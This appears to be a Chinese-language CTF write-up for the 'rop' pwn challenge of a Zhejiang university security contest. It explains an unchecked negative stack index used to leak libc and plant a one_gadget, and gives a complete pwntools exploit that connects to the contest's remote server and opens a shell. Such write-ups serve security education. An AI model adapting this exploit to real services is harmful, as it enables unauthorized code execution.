---
title: 第八届浙江省大学生网络与信息安全竞赛 初赛 - rop
date: 2026/03/20 16:20:00
updated: 2026/03/27 16:27:00
tags:
    - ROP
thumbnail: /assets/zhejiang2025/rdx_is_idx.png
excerpt: 利用负数索引泄露 libc，覆盖 input 返回地址使 rdx 为 0 满足 one_gadget 条件，写入 one_gadget 直接 get shell。
---

> easy rop

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO|Partial|
|Canary|on    |
|NX    |on    |
|PIE   |off   |
|strip |yes   |
|libc  |2.31-0ubuntu9.16|

## 解题思路

题目可以往栈上压入数据，也可以根据索引从栈上弹出数据，索引没有做判断，可以为负数。
首先通过负数泄露libc。注意到在input函数返回时，rdx为当前栈上的索引，当我们pop一个数字后，
再输入一个数字，刚好能覆盖到input函数的返回地址，并且使得rdx正好变为0。
此时寄存器状态刚好满足one_gagdet的条件，因此我们只需要写入一个one_gadget就可以拿shell了。

<img src="/assets/zhejiang2025/reg_ctx.png" width="70%">

<img src="/assets/zhejiang2025/rdx_is_idx.png" width="70%">

<img src="/assets/zhejiang2025/one_gadget.png" width="50%">

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
EXE = './rop'

def payload(lo: int):
    global t
    if lo:
        t = process(EXE)
        if lo & 2:
            gdb.attach(t)
    else:
        t = remote('45.40.247.139', 18604)
    elf = ELF(EXE)
    libc = elf.libc

    def do_input(number: int):
        t.sendlineafter(b'output.', b'1')
        t.sendlineafter(b'your number', str(number).encode())

    def do_output(idx: int) -> int:
        t.sendlineafter(b'output.', b'2')
        t.sendlineafter(b'index', str(idx).encode())
        t.recvuntil(b'your number:\n')
        return int(t.recvline())

    libc_base = do_output(-22) - libc.symbols['_IO_2_1_stdout_']
    success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))

    do_input(libc_base + 0xe3b01) # one_gadget

    t.clean()
    t.interactive()
    t.close()
```

{% note default fa-flag %}
![flag](/assets/zhejiang2025/rop_flag.png)
{% endnote %}
